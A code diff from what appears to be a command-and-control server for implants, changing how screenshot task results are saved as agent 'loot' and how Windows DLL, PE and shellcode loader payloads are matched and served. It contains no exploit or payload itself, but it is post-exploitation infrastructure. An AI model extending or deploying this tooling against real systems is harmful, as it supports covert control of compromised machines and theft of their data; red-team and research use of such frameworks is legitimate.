@@ -366,12 +366,16 @@ func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
 			}
 			content = fmt.Sprintf("Saved file under %s/procdumps", agLootDir)
 		case _task.TASK_SCREENSHOT:
-			agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
-			if err != nil {
-				ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
-				return
+			if strings.Contains(taskResult.Result, "Error:") {
+				content = taskResult.Result
+			} else {
+				agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
+				if err != nil {
+					ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
+					return
+				}
+				content = fmt.Sprintf("Saved file under %s/screenshots", agLootDir)
 			}
-			content = fmt.Sprintf("Saved file under %s/screenshots", agLootDir)
 		case _task.TASK_SLEEP:
 			timeStr := taskResult.Task.Args["time"]
 			time, err := strconv.ParseUint(timeStr, 10, 64)
@@ -577,7 +581,7 @@ func handleLoaderDownload(lis *listener.Listener, serverState *state.ServerState
 				// ...
 			}
 			if ldrData.OS == "windows" {
-				if ldrData.LoaderType == "dll" {
+				if ldrData.LoaderType == "dll-loader" {
 					// Load a DLL file.
 					if ldrData.Arch == "amd64" {
 						if strings.HasSuffix(payloadPath, ".amd64.dll") {
@@ -590,7 +594,7 @@ func handleLoaderDownload(lis *listener.Listener, serverState *state.ServerState
 							break
 						}
 					}
-				} else if ldrData.LoaderType == "exec" {
+				} else if ldrData.LoaderType == "pe-loader" {
 					// Load an executable file.
 					if ldrData.Arch == "amd64" {
 						if strings.HasSuffix(payloadPath, ".amd64.exe") {
@@ -603,15 +607,17 @@ func handleLoaderDownload(lis *listener.Listener, serverState *state.ServerState
 							break
 						}
 					}
-				} else if ldrData.LoaderType == "shellcode" {
+				} else if ldrData.LoaderType == "shellcode-loader" {
 					// Load a shellcode (raw) file.
 					if ldrData.Arch == "amd64" {
-						if strings.HasSuffix(payloadPath, ".x64.bin") {
+						if strings.HasSuffix(payloadPath, ".amd64.bin") {
 							targetPayloadPath = payloadPath
+							break
 						}
 					} else if ldrData.Arch == "i686" {
-						if strings.HasSuffix(payloadPath, ".x86.bin") {
+						if strings.HasSuffix(payloadPath, ".i686.bin") {
 							targetPayloadPath = payloadPath
+							break
 						}
 					}
 					if strings.HasSuffix(payloadPath, ".bin") {
